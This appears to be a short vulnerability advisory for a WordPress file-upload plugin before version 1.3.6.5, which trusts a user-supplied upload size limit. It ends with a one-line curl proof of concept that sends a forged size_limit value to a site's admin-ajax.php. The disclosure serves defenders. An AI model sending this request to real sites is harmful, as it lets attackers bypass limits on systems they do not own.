## WordPress Plugin Vulnerabilities

# Drag and Drop Multiple File Upload < 1.3.6.5 - File Upload Size Limit Bypass

### Description

The plugin does not properly check for the upload size limit set in forms, taking the value from user input sent when submitting the form. As a result, attackers could control the file length limit and bypass the limit set by admins in the contact form.

### Proof of Concept

curl -X POST -F "size\_limit=10485760" -F "action=dnd\_codedropz\_upload" -F "type=click" -F "form\_id=156" -F "upload\_name=upload-file-235" -F "upload-file=@upload.png" https://example.com/wordpress/wp-admin/admin-ajax.php
